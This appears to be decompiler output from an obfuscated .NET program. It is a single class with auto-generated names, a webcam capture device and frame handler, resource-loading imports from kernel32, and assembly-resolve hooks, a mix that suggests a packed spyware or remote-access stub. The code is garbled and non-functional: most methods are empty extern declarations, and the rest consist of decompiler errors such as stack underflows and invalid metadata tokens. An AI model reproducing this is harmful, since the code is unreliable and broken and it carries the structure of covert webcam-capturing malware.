using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using AForge.Video;
using AForge.Video.DirectShow;

internal class Class0
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static bool bool_5;

	public static bool bool_6;

	public static bool bool_7;

	public static bool bool_8;

	public static bool bool_9;

	public static string string_3;

	public static string string_4;

	public static List<string> list_0;

	public static List<string> list_1;

	public static string string_5;

	public static bool bool_10;

	public static VideoCaptureDevice videoCaptureDevice_0;

	public static long long_0;

	public static long long_1;

	public static string string_6;

	public static int int_0;

	public static string string_7;

	public static int int_1;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string string_13);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_13, string string_14);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	private static extern Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0);

	private static extern void smethod_1();

	private static extern void smethod_2(string string_13, string string_14, bool bool_11);

	private static string smethod_3()
	{
		//Discarded unreachable code: IL_0005, IL_0009, IL_000e, IL_001a
		//IL_0008: Expected I8, but got I
		/*Error: Invalid metadata token*/;
	}

	private static extern string smethod_4();

	private static extern void smethod_5();

	private static extern void smethod_6(string string_13);

	public static void smethod_7()
	{
		//Discarded unreachable code: IL_001b, IL_0024, IL_002d
		//IL_0008: Expected F8, but got I8
		//IL_001f: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		do
		{
			long num = ((long[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
			ulong num2 = checked((ulong)(-112217112));
			((double[])/*Error near IL_0008: Stack underflow*/)[num] = (long)num2;
		}
		while (/*Error near IL_000d: Stack underflow*/ < /*Error near IL_000d: Stack underflow*/|| /*Error near IL_0012: Stack underflow*/<= /*Error near IL_0012: Stack underflow*/);
		checked
		{
			_ = (nint)((double[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/];
			_ = 8;
			/*Error near IL_0016: Invalid metadata token*/;
		}
	}

	public static extern void smethod_8(object object_0);

	public static extern void smethod_9();

	private static extern void Main(string[] args);

	public static extern bool smethod_10(string string_13);

	public static void smethod_11()
	{
		//Discarded unreachable code: IL_0007
		_ = ((Array)/*Error near IL_0002: Stack underflow*/).LongLength;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	public static extern void smethod_12(object sender, NewFrameEventArgs e);

	private static extern Assembly smethod_13(object object_0, ResolveEventArgs resolveEventArgs_0);

	private static void smethod_14()
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0012, IL_0017, IL_001c, IL_001d, IL_0023, IL_0032, IL_0038, IL_0041
		//IL_000d: Incompatible stack heights: 0 vs 2
		//IL_002c: Expected F8, but got I8
		//IL_0047: Expected I4, but got Unknown
		/*Error: Invalid metadata token*/;
	}

	private static extern string smethod_15();

	private static extern void smethod_16();

	public static extern string smethod_17();

	public static extern string smethod_18();

	public static extern byte[] smethod_19(byte[] byte_0);

	public static extern string smethod_20(string string_13);

	public static extern string smethod_21(string string_13);

	public static extern string smethod_22(string string_13);

	public static extern long smethod_23();

	public static extern long smethod_24(long long_2);

	private unsafe static long smethod_25()
	{
		checked
		{
			while ((long)(*unchecked((int*)(nint)/*Error near IL_0001: ldarga 0 (out-of-bounds)*/)) != 0L)
			{
			}
			throw;
		}
	}

	private static extern long smethod_26();

	private static extern long smethod_27();

	private static extern long smethod_28();

	public extern Class0();
}
